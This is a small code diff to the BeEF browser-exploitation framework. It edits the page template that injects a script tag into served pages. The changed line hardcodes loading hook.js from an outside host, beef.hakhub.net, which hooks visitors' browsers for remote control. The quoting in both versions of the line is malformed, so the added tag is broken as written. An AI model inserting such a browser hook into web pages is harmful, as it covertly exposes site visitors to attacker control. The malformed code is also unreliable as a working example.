@@ -197,7 +197,7 @@ module BeEF
             '</div>' \
             '</div>'
             +
-              ("<script src='https://beef.hakhub.net/hook.js'")
+              ("<script src='https://beef.hakhub.net/hook.js></script>'")
             +
               ("<script src='#{config.get('beef.http.hook_file')}'></script>" if config.get('beef.http.web_server_imitation.hook_root')).to_s +
               '</body>' \
